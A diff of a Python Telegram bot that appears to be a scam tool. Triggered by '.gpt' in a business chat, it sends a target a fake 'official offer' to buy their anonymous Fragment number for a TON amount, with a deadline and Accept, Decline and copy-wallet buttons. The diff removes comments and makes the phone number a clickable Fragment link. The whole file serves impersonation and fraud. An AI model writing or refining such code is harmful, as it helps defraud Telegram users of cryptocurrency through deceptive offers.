@@ -15,11 +15,10 @@ dispatcher = Dispatcher()
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
-CUSTOM_EMOJI_ID = "6023826881160157558" # Твой эмодзи
+CUSTOM_EMOJI_ID = "6023826881160157558"
 
 CUSTOM_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_EMOJI_ID}">💎</tg-emoji>'
 
-# Функция безопасного удаления
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
         try:
@@ -35,7 +34,6 @@ async def safe_delete(chat_id, message_id, conn_id=None):
     except Exception:
         pass
 
-# --- ОБРАБОТЧИК КОМАНДЫ .gpt ---
 @dispatcher.business_message(F.text.startswith(".gpt"))
 async def send_offer(message: Message):
     if not message.business_connection_id:
@@ -50,7 +48,6 @@ async def send_offer(message: Message):
     if message.from_user.id != owner_id:
         return
 
-    # Парсинг
     text_clean = message.text.replace(".gpt", "").replace(" ", "").strip()
     
     phone_match = re.search(r"\+(\d+)", text_clean)
@@ -75,9 +72,10 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # НОВЫЙ ТЕКСТ С ЭМОДЗИ
+    # НОМЕР ТЕПЕРЬ КЛИКАБЕЛЬНАЯ ССЫЛКА (СИНИЙ)
     offer_text = (
         f"{CUSTOM_EMOJI} Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
+        f"Номер: <a href='{fragment_link}'>{formatted_phone}</a>\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
         f"Срок действия: <b>5ч 59м</b>\n\n"
         f"<i>Для рассмотрения предложения и запуска процедуры передачи, нажмите «Принять».</i>"
@@ -108,7 +106,6 @@ async def send_offer(message: Message):
         except:
             pass
 
-# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
     conn_id = callback.message.business_connection_id
@@ -145,14 +142,12 @@ async def on_accept_offer(callback: CallbackQuery):
 
     await callback.answer()
 
-# --- ОБРАБОТЧИК "ОТКЛОНИТЬ" ---
 @dispatcher.callback_query(F.data == "decline_offer")
 async def on_decline(callback: CallbackQuery):
     conn_id = callback.message.business_connection_id
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
     await callback.answer("Вы отклонили предложение.", show_alert=True)
 
-# --- КОПИРОВАНИЕ КОШЕЛЬКА ---
 @dispatcher.callback_query(F.data == "copy_wallet")
 async def on_copy_wallet(callback: CallbackQuery):
     await callback.answer(f"Кошелек скопирован: {TON_WALLET}", show_alert=True)
